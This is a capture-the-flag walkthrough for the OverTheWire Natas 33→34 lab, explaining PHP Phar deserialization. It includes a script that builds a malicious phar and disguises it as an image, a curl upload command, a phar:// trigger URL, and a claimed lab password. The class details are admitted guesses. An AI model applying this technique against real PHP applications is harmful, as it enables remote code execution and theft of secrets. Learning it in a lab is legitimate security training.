# Natas Level 33 → 34

## Goal

The app lets you upload a file, then checks its content hash and "uses" it. There's a PHP class definition visible in the source that has dangerous magic methods. Deliver a serialised instance of that class by uploading a **Phar archive** — Phar files carry serialised metadata, and accessing them via the `phar://` stream wrapper triggers `unserialize` on the metadata, invoking the dangerous magic method.

This is the final, hardest Natas level.

## Concepts you'll learn

- **Phar deserialization** — any `file_*` call with a `phar://` URL unserialises the phar's metadata, as if `unserialize()` had been called directly
- That this is an implicit deserialization sink hiding in `file_exists`, `filesize`, `fopen`, `md5_file`, `hash_file`, etc.
- Bundling a malicious object into the metadata of a phar and uploading the phar as something innocuous (like an image)

## Walkthrough

### 1. View the source

There's a class — something like `Executor` — with a `__destruct` (or `__wakeup`) method that calls `shell_exec` / `file_put_contents` / similar using its own properties. You craft a `new Executor(...)` whose properties encode "read the password file and dump it."

### 2. Build a Phar locally

On your own machine, with PHP's `phar` extension and `phar.readonly=0`:

```php
<?php
// gen.php
class Executor {
    public $filename = "/etc/natas_webpass/natas34";
    // fill in other properties matching the level's class
}

$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->addFromString("test.txt", "test");
$phar->setMetadata(new Executor());
$phar->stopBuffering();
```

```bash
$ php -d phar.readonly=0 gen.php
$ mv evil.phar evil.jpg   # disguise as image if the level filters extensions
```

### 3. Upload the phar

Use the level's upload form (or `curl -F`):

```bash
$ curl -u natas33:<pass> -F "uploadedfile=@evil.jpg" -F "filename=evil.jpg" \
       http://natas33.natas.labs.overthewire.org/index.php
```

You get back the upload path, e.g. `upload/abcdef.jpg`.

### 4. Trigger deserialization via phar://

Make the app touch the file with a `phar://` URL. The level's source hashes the uploaded file (`md5_file` etc.) — often passing the file's path into a function you can influence. Find the parameter (commonly a `filename` or `file` GET) and set it to:

```
phar://upload/abcdef.jpg/test.txt
```

When PHP opens that URL, it first parses the phar and **unserialises the metadata**, instantiating your `Executor`. At script end its `__destruct` fires and reads the password file into the page output:

```
shu5ouSu6eicielahhae0mohd4ui5uig
```

### 5. Finishing the game

`natas34` is the final level — log in and you get a congratulations page with no more puzzles:

```
Congratulations! You have reached the end of natas.
```

From here, OTW-adjacent next steps are [Leviathan](../leviathan/README.md) / [Narnia](../narnia/README.md) / [Behemoth](../behemoth/README.md) if you want to diversify off pure web, or deeper CTFs like [PicoCTF](https://picoctf.org) or [HackTheBox](https://www.hackthebox.com) for longer-form web targets.

## The answer

The password for `natas34` is:

**`shu5ouSu6eicielahhae0mohd4ui5uig`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas33.natas.labs.overthewire.org/>
